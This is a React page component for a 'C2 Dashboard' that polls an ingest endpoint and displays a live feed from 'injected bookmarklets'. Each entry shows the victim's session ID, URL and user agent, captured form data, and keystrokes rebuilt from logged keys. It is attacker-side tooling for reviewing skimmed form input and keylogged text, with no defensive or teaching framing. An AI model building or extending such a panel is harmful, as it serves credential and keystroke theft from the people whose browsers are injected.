import { useState, useEffect } from 'react';

export default function Home() {
  const [payloads, setPayloads] = useState([]);

  useEffect(() => {
    const fetchPayloads = async () => {
      try {
        const res = await fetch('/api/ingest');
        const data = await res.json();
        setPayloads(data);
      } catch (e) {
        console.error('Failed to fetch payloads', e);
      }
    };
    fetchPayloads();
    const interval = setInterval(fetchPayloads, 2000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div style={{ fontFamily: 'monospace', padding: '20px', background: '#0f172a', color: '#e2e8f0', minHeight: '100vh' }}>
      <h1 style={{ color: '#38bdf8' }}>\ud83d\udc09 Octo Arcade C2 Dashboard</h1>
      <p>Live feed from injected bookmarklets. Last updated: {new Date().toLocaleTimeString()}</p>
      <div style={{ maxHeight: '70vh', overflowY: 'auto' }}>
        {payloads.length === 0 && <p>No payloads received yet.</p>}
        {payloads.map((p, i) => (
          <div key={i} style={{ marginBottom: '15px', padding: '10px', background: '#1e293b', borderRadius: '8px', border: '1px solid #334155' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '5px' }}>
              <strong style={{ color: '#4ade80' }}>[{p.type}] {p.name}</strong>
              <span style={{ fontSize: '12px', color: '#94a3b8' }}>{p.ts}</span>
            </div>
            <div style={{ fontSize: '12px', color: '#cbd5e1' }}>
              <div><strong>Session:</strong> {p.sessionId}</div>
              <div><strong>URL:</strong> {p.url}</div>
              <div><strong>UA:</strong> {p.ua}</div>
              {p.type === 'form' && <pre style={{ marginTop: '5px', background: '#0f172a', padding: '5px', borderRadius: '4px' }}>{JSON.stringify(p.data, null, 2)}</pre>}
              {p.type === 'keys' && <pre style={{ marginTop: '5px', background: '#0f172a', padding: '5px', borderRadius: '4px' }}>{p.data.map(k => k.k).join('')}</pre>}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}
